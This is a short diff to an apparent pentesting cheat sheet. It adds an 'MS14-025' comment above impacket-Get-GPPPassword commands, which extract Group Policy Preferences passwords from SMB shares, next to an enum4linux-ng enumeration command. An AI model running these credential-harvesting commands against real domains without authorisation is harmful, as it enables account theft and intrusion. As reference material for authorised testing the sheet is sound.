@@ -314,6 +314,7 @@ enum4linux-ng -A -Gm -C -u 'USERNAME' -p 'PASSWORD' -d -t 'TIMEOUT' 'IP'
 ```
 - impacket-Get-GPPPassword
 ```sh
+# MS14-025
 impacket-Get-GPPPassword -share 'SHARENAME' -ts 'DOMAIN/USERNAME:PASSWORD@IP'
 impacket-Get-GPPPassword -share 'SHARENAME' -base-dir 'PATH' -ts 'DOMAIN/USERNAME:PASSWORD@IP'
 ```
